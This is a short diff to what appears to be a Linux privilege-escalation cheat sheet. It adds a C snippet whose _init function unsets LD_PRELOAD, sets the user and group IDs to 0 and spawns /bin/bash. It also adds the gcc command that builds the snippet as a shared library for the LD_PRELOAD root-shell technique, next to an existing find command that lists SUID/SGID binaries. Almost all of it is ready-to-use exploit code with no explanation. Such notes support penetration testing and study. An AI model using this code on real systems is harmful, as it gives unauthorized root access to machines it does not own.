@@ -7,3 +7,19 @@ or
 ```shell
 find / -perm /u=s,g=s 2> /dev/null
 ```
+# example 
+```c
+#include <stdio.h>  
+#include <sys/types.h>  
+#include <stdlib.h>  
+  
+void _init() {  
+unsetenv("LD_PRELOAD");  
+setgid(0);  
+setuid(0);  
+system("/bin/bash");  
+}
+```
+```shell-session
+gcc -fPIC -shared -o lib.so file.c -nostartfiles
+```
